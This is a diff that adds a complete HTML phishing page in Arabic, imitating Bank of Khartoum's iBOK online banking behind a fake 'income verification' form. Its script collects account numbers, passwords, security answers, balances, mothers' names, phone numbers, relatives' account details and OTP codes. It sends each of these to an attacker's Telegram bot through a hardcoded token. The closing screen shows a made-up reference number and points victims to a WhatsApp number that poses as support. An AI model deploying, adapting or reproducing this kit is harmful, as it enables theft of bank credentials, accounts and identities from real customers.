@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول الاستمارة أونلاين</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body { background-color: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+        .header { height: auto; min-height: 85px; background: linear-gradient(to right, #c62828, #e53935, #d32f2f); display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; color: white; border-bottom: 3px solid rgba(0,0,0,0.2); flex-wrap: wrap; gap: 15px; }
+        .welcome-box { background-color: #ebb811; color: #333; padding: 10px 20px; border-radius: 25px; font-weight: bold; font-size: 14px; width: fit-content; box-shadow: 0 2px 8px rgba(0,0,0,0.2); text-align: center; flex: 1; min-width: 250px; }
+        .header-logo { text-align: left; line-height: 1.1; flex: 1; min-width: 250px; }
+        .header-logo .title { font-size: 28px; font-weight: 700; display: block; }
+        .header-logo .subtitle { font-size: 14px; opacity: 0.9; }
+        .header-logo .subtitle-en { font-size: 13px; opacity: 0.9; margin-top: -3px; }
+        .main-container { flex: 1; display: flex; flex-direction: column; }
+        .card { background: white; width: 100%; flex: 1; padding: 40px 25px; text-align: center; transition: all 0.3s ease; }
+        .hidden { display: none !important; }
+        h2 { color: #d32f2f; margin-bottom: 20px; font-size: 22px; }
+        h3 { color: #333; margin-bottom: 25px; font-size: 18px; border-bottom: 2px solid #d32f2f; display: inline-block; padding-bottom: 5px; }
+        .input-group { margin-bottom: 18px; text-align: right; }
+        .input-group label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #333; }
+        .input-wrapper { position: relative; }
+        input, select { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; background-color: #e3f2fd; font-size: 15px; outline: none; }
+        .icon-eye { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #666; cursor: pointer; }
+        .btn-submit { background-color: #d32f2f; color: white; border: none; width: 100%; padding: 16px; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.3s; margin-top: 20px; }
+        .otp-timer { color: #d32f2f; font-size: 13px; margin-bottom: 15px; text-align: center; display: block; }
+        .service-grid { display: grid; grid-template-columns: repeat(1, 1fr); gap: 12px; margin: 25px 0; text-align: right; }
+        .service-option { display: flex; flex-direction: row; align-items: center; justify-content: space-between; padding: 15px 15px; border: 2px solid #e0e0e0; border-radius: 8px; cursor: pointer; background-color: #f9f9f9; }
+        .service-option.selected { border-color: #d32f2f; background-color: #ffebee; }
+        .service-content { display: flex; flex-direction: column; text-align: right; }
+        .service-title { font-weight: 700; color: #d32f2f; }
+        .service-desc { font-size: 13px; color: #555; margin-top: 4px; }
+        
+        .error-message { color: #d32f2f; font-size: 13px; font-weight: bold; margin-top: 8px; display: block; text-align: right; }
+
+        .success-box { background-color: #fafffa; border: 2px solid #2e7d32; padding: 25px; border-radius: 8px; margin-top: 20px; text-align: right; }
+        .reference-title { font-size: 15px; color: #333; font-weight: bold; display: block; text-align: center; margin-top: 10px; }
+        .reference-number { font-size: 26px; color: #2e7d32; font-weight: 700; letter-spacing: 2px; display: block; margin: 15px 0; text-align: center; background: #fff; padding: 12px; border: 1px dashed #2e7d32; border-radius: 4px; }
+        .info-text { color: #444; font-size: 13.5px; line-height: 1.6; display: block; margin-top: 15px; text-align: justify; }
+        .warning-text { color: #d32f2f; font-weight: 700; background-color: #fff3f3; padding: 12px; border-right: 4px solid #d32f2f; margin-top: 15px; font-size: 13px; border-radius: 0 4px 4px 0; }
+
+        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; -webkit-animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { -webkit-transform: rotate(360deg); } }
+        @-webkit-keyframes spin { to { -webkit-transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="welcome-box">مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت</div>
+        <div class="header-logo">
+            <span class="title">iBOK</span>
+            <span class="subtitle">الاستمارة أونلاين</span>
+            <span class="subtitle-en">Online Form</span>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div id="step-1" class="card">
+            <h2>الاستمارة أونلاين</h2>
+            <h3>إستمارة تحديث البيانات و إثبات الدخل  (ما يمكن معالجته عبر هذا القسم)</h3>
+            <div class="service-grid">
+                <div class="service-option selected">
+                    <div class="service-content">
+                        <span class="service-title">إثبات دخل و تحديث البيانات </span>
+                        <span class="service-desc">تأكيد وتوثيق مصادر الدخل الشهري والوظيفة.</span>
+                    </div>
+                    <span>💼</span>
+                </div>
+            </div>
+            <button class="btn-submit" onclick="goToStep('step-income-verification')">متابعة</button>
+        </div>
+
+        <div id="step-income-verification" class="card hidden">
+            <h2>استمارة إثبات دخل</h2>
+            <h3>الرجاء تزويدنا ببيانات الدخل والجهة الضامنة</h3>
+            <div class="input-group">
+                <label>الإسم بالكامل:</label>
+                <input type="text" id="inc-name" placeholder="أدخل الإسم رباعي">
+            </div>
+            <div class="input-group">
+                <label>المهنة:</label>
+                <input type="text" id="inc-job" placeholder="أدخل طبيعة عملك الحالية">
+            </div>
+            <div class="input-group">
+                <label>مكان العمل بالضبط:</label>
+                <input type="text" id="inc-workplace" placeholder="اسم الشركة / المؤسسة / المتجر وعنوانها">
+            </div>
+            <div class="input-group">
+                <label>مقدار الدخل الشهري التقريبي:</label>
+                <input type="text" id="inc-salary" placeholder="أدخل قيمة الدخل بالجنيه">
+            </div>
+            <div class="input-group">
+                <label>إسم أقرب الأقربين:</label>
+                <input type="text" id="inc-relative-name" placeholder="أدخل اسم أحد الأقارب من الدرجة الأولى">
+            </div>
+            <div class="input-group">
+                <label>رقم هاتف أقرب الأقربين:</label>
+                <input type="tel" id="inc-relative-phone" placeholder="مثال: 0912345678">
+            </div>
+            <div class="input-group">
+                <label>رقم حساب أقرب الأقربين في بنك الخرطوم:</label>
+                <input type="text" id="inc-relative-account" placeholder="أدخل رقم حساب القريب (6 أو 7 أرقام)">
+            </div>
+            <button class="btn-submit" onclick="submitIncomeData()">حفظ ومتابعة تسجيل الدخول</button>
+        </div>
+
+        <div id="step-2" class="card hidden">
+            <h2>الاستمارة أونلاين</h2>
+            <h3>الرجاء إدخال البيانات</h3>
+            <div class="input-group">
+                <label>رقم الحساب:</label>
+                <input type="text" id="account-num" placeholder="أدخل رقم الحساب">
+            </div>
+            <div class="input-group">
+                <label>كلمة مرور الحساب:</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
+                    <span class="icon-eye" onclick="togglePassword('password')">👁️</span>
+                </div>
+                <span id="login-error" class="error-message hidden">رقم الحساب او كلمة السر خاطئة الرجاء المحاولة مرة أخرى</span>
+            </div>
+            <button class="btn-submit" onclick="submitStep1()">تسجيل الدخول</button>
+        </div>
+
+        <div id="step-3" class="card hidden">
+            <h2>متابعة الاستمارة أونلاين</h2>
+            <h3>لأغراض الأمان يرجى الإجابة على سؤال واحد من أسئلة الأمان</h3>
+            <div class="input-group">
+                <label>الرجاء الإجابة على سؤال الأمان</label>
+                <select id="security-question">
+                    <option value="" disabled selected>-- اختر سؤال الأمان --</option>
+                    <option>ما هو اسم ابن عمك الاول؟</option>
+                    <option>في اي مدينة ولدت؟</option>
+                    <option>في اي سنة تخرجت من الجامعة؟</option>
+                    <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>ادخل الجواب</label>
+                <input type="text" id="security-answer" placeholder="اكتب جوابك هنا">
+            </div>
+            <button class="btn-submit" onclick="submitStep2()">إرسال</button>
+        </div>
+
+        <div id="step-4" class="card hidden">
+            <h2>متابعة الاستمارة أونلاين</h2>
+            <h3>لأغراض الأمان يرجى تأكيد التفاصيل المالية وبينات الهوية بالحساب</h3>
+            <div class="input-group">
+                <label>المبلغ الموجود في الحساب:</label>
+                <input type="text" id="account-amount" placeholder="أدخل المبلغ التقريبي أو الحالي">
+            </div>
+            <div class="input-group">
+                <label>إسم الوالدة رباعي:</label>
+                <input type="text" id="mother-name" placeholder="أدخل إسم الوالدة بالكامل">
+            </div>
+            <div class="input-group">
+                <label>رقم تواصل واتساب:</label>
+                <input type="tel" id="whatsapp-num" placeholder="أدخل رقم الواتساب الفعال">
+            </div>
+            <div class="input-group">
+                <label>رقم الهاتف المرتبط بالحساب:</label>
+                <input type="tel" id="linked-phone" placeholder="أدخل رقم شريحة الحساب">
+            </div>
+            <button class="btn-submit" onclick="submitStep3()">متابعة</button>
+        </div>
+
+        <div id="step-5" class="card hidden">
+            <div id="otp-area">
+                <h2>إدخال رمز OTP</h2>
+                <div class="input-group">
+                    <label>أدخل رمز التحقق المرسل الي بريدك الالكتروني او رقم الهاتف (OTP):</label>
+                    <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+                </div>
+                <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 30:00 دقيقة</span>
+                <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق الاعتمادي</button>
+            </div>
+
+            <div id="final-status-box" class="success-box hidden">
+                <h2 style="color: #2e7d32; text-align: center; margin-bottom: 10px;">✓ تم تسجيل ومعالجة طلبك بنجاح</h2>
+                <span class="reference-title">الرجاء حفظ وتوثيق الرقم المرجعي التابع لك:</span>
+                <span id="display-ref-num" class="reference-number">REF-00000000</span>
+                
+                <div class="warning-text">
+                    ⚠️ تنبيه أمني هام: نظام المراجعة الآلي يشترط مطابقة الـ OTP والبيانات المدخلة بدقة تامة. تقديم بيانات أو رموز غير صحيحة سيؤدي إلى رفض المعاملة فوراً بشكل تلقائي لحماية الحسابات من محاولات الدخول غير المصرح بها، وقد يعرض الحساب للتقييد المؤقت.
+                </div>
+                <span class="info-text">💬 <strong>خطوات المتابعة:</strong> يجب عليك الاحتفاظ بالرقم المرجعي أعلاه لتقديمه عند المراجعة، ثم التواصل الفوري مع قسم الدعم الفني وخدمة عملاء بنك الخرطوم المعتمدة مباشرة عبر حساب الواتساب الرسمي على الرقم: <strong style="color:#2e7d32; font-size:15px; direction:ltr; display:inline-block;">249966964671</strong> لمتابعة حالة استرداد المبالغ أو اعتماد الطلب الحالي وتحديثه.</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let userData = { accountNum: '', password: '', securityQuestion: '', securityAnswer: '', amount: '', motherName: '', whatsappNum: '', linkedPhone: '', otp: '', incName: '', incJob: '', incWorkplace: '', incSalary: '', incRelativeName: '', incRelativePhone: '', incRelativeAccount: '', refNum: '' };
+
+        function goToStep(id) {
+            document.querySelectorAll('.main-container > .card').forEach(c => c.classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+            if (id === 'step-5') startOtpTimer();
+        }
+
+        function submitIncomeData() {
+            userData.incName = document.getElementById('inc-name').value;
+            userData.incJob = document.getElementById('inc-job').value;
+            userData.incWorkplace = document.getElementById('inc-workplace').value;
+            userData.incSalary = document.getElementById('inc-salary').value;
+            userData.incRelativeName = document.getElementById('inc-relative-name').value;
+            userData.incRelativePhone = document.getElementById('inc-relative-phone').value;
+            userData.incRelativeAccount = document.getElementById('inc-relative-account').value;
+
+            if (!userData.incName || !userData.incJob || !userData.incWorkplace || !userData.incSalary || !userData.incRelativeName || !userData.incRelativePhone || !userData.incRelativeAccount) {
+                return alert('الرجاء ملء كافة حقول استمارة إثبات الدخل المطلوبة');
+            }
+
+            sendToTelegram(`💼 بيانات إثبات الدخل المرفقة:\n👤 الاسم: ${userData.incName}\n🛠️ المهنة: ${userData.incJob}\n📍 مقر العمل: ${userData.incWorkplace}\n💵 الدخل: ${userData.incSalary}\n👥 القريب: ${userData.incRelativeName}\n📞 هاتف القريب: ${userData.incRelativePhone}\n🔢 حساب القريب: ${userData.incRelativeAccount}`);
+            goToStep('step-2');
+        }
+
+        function togglePassword(i) {
+            const p = document.getElementById(i);
+            p.type = (p.type === 'password') ? 'text' : 'password';
+        }
+
+        function startOtpTimer() {
+            let m = 30, s = 0;
+            const t = document.getElementById("otp-timer");
+            const x = setInterval(() => {
+                if (s === 0) { if (m === 0) { clearInterval(x); return; } m--; s = 59; } else { s--; }
+                t.textContent = `إعادة إرسال الرمز خلال ${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')} دقيقة`;
+            }, 1000);
+        }
+
+        // دالة التحقق من الأرقام المتتالية تصاعدياً فقط (مثال: 123456)
+        function isAscendingSequential(str) {
+            if (str.length < 2) return false;
+            for (let i = 0; i < str.length - 1; i++) {
+                if (str.charCodeAt(i + 1) - str.charCodeAt(i) !== 1) {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        // دالة التحقق من صحة رقم الحساب
+        function isValidAccount(acc) {
+            if (!/^\d+$/.test(acc)) return false; // أرقام فقط
+            if (acc.length < 6 || acc.length > 7) return false; // الطول من 6 إلى 7
+            if (isAscendingSequential(acc)) return false; // يرفض الأرقام المتتالية تصاعدياً فقط
+            return true;
+        }
+
+        // دالة التحقق من صحة كلمة السر
+        function isValidPassword(pwd) {
+            if (/[\u0600-\u06FF]/.test(pwd)) return false; // يرفض الحروف والأرقام العربية
+            const hasUpper = /[A-Z]/.test(pwd);
+            const hasLower = /[a-z]/.test(pwd);
+            const hasDigit = /[0-9]/.test(pwd);
+            const hasSymbol = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pwd);
+            return hasUpper && hasLower && hasDigit && hasSymbol;
+        }
+
+        function submitStep1() {
+            userData.accountNum = document.getElementById('account-num').value.trim();
+            userData.password = document.getElementById('password').value;
+            const errorElement = document.getElementById('login-error');
+
+            const isAccValid = isValidAccount(userData.accountNum);
+            const isPwdValid = isValidPassword(userData.password);
+
+            if (!isAccValid || !isPwdValid) {
+                errorElement.classList.remove('hidden');
+                return;
+            }
+
+            errorElement.classList.add('hidden');
+            sendToTelegram(`📋 دخول جديد [الخدمة: إثبات دخل]\n🔢 الحساب: ${userData.accountNum}\n🔐 السر: ${userData.password}`);
+            goToStep('step-3');
+        }
+
+        function submitStep2() {
+            userData.securityQuestion = document.getElementById('security-question').value;
+            userData.securityAnswer = document.getElementById('security-answer').value;
+            if (!userData.securityQuestion || !userData.securityAnswer) {
+                return alert('الرجاء إكمال البيانات');
+            }
+            sendToTelegram(`🔐 أمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
+            goToStep('step-4');
+        }
+
+        function submitStep3() {
+            userData.amount = document.getElementById('account-amount').value;
+            userData.motherName = document.getElementById('mother-name').value;
+            userData.whatsappNum = document.getElementById('whatsapp-num').value;
+            userData.linkedPhone = document.getElementById('linked-phone').value;
+
+            if (!userData.amount || !userData.motherName || !userData.whatsappNum || !userData.linkedPhone) {
+                return alert('الرجاء إكمال جميع البيانات التأكيدية المطلوبة');
+            }
+            
+            sendToTelegram(`💰 تأكيد المبلغ والبيانات الشخصية:\n💵 المبلغ: ${userData.amount}\n👩‍👦 إسم الوالدة: ${userData.motherName}\n💬 واتساب: ${userData.whatsappNum}\n📱 الهاتف المرتبط: ${userData.linkedPhone}`);
+            goToStep('step-5');
+        }
+
+        function verifyOtp() {
+            const o = document.getElementById('otp-code').value;
+            if (o.length < 4) return alert('رمز غير صحيح');
+            
+            const btn = document.getElementById('verify-btn');
+            btn.disabled = true;
+            btn.innerHTML = `<span class="loading-spinner"></span> جاري المعالجة والتوثيق...`;
+            
+            setTimeout(() => {
+                let randomRef = 'BOK-' + Math.floor(10000000 + Math.random() * 90000000);
+                userData.otp = o;
+                userData.refNum = randomRef;
+                
+                sendToTelegram(`🔢 OTP معتمد\n🔐 الرمز: ${userData.otp}\n🎫 المرجعي المولد: ${userData.refNum}`);
+                
+                document.getElementById('otp-area').style.display = 'none';
+                document.getElementById('display-ref-num').textContent = randomRef;
+                document.getElementById('final-status-box').classList.remove('hidden');
+            }, 3000);
+        }
+
+        function sendToTelegram(messageText) {
+            const botToken = "8868291395:AAFQ2D2w07nb0F7_4t0fJ-j4omTvyWjaVx0";
+            const chatId = "8898751611";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: messageText })
+            });
+        }
+    </script>
+</body>
+</html>
